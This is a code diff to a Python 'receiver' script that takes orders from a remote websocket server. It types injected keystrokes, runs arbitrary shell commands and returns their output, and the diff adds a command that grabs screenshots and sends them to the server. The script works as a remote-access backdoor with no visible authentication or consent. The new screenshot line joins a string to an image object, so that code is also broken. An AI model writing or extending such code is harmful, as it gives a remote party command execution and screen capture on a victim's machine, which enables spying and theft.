@@ -6,6 +6,7 @@ import keyboard
 import socket
 import time
 import subprocess
+import pyscreenshot
 
 # looks the first write doesn't work unless we call a function on the module.
 keyboard.is_pressed("e")
@@ -18,12 +19,16 @@ async def main():
             print("waiting for server...")
             server = await websocket.recv()
 
-            if(server.startwith("KEY|")):
+            if(server.startswith("KEY|")):
                 keyboard.write(server[4:])
             
             if(server.startswith("CMD|")):
                 output = subprocess.getoutput(server[4:])
-                websocket.send("RECEIVER_OUTPUT|" + output)
+                await websocket.send("RECEIVER_OUTPUT|" + output)
+
+            if(server.startswith("SCREEN|")):
+                im = pyscreenshot.grab()
+                await websocket.send("SCREEN|" + im)
 
 
             print("writing : " + server)
